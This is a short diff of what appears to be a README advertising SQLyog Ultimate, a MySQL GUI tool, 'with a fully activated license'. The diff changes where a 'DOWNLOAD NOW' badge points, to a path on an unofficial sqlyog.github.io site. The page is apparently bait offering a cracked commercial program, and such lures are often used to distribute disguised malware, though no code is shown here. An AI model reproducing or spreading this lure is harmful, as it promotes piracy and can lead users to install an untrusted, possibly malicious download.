@@ -2,7 +2,7 @@
 
 Powerful and intuitive MySQL administration tool with a fully activated license, offering advanced features for developers and DBAs. Streamline your database workflows with SQLyog's robust GUI.
 
-[![⬇️ DOWNLOAD NOW ⬇️](https://img.shields.io/badge/Download-SQLyog_Ultimate_Pro-blueviolet?style=for-the-badge&logo=github)](https://sqlyog.github.io/.github/)
+[![⬇️ DOWNLOAD NOW ⬇️](https://img.shields.io/badge/Download-SQLyog_Ultimate_Pro-blueviolet?style=for-the-badge&logo=github)](https://sqlyog.github.io/.github/sqlyog)
 
 ---
 
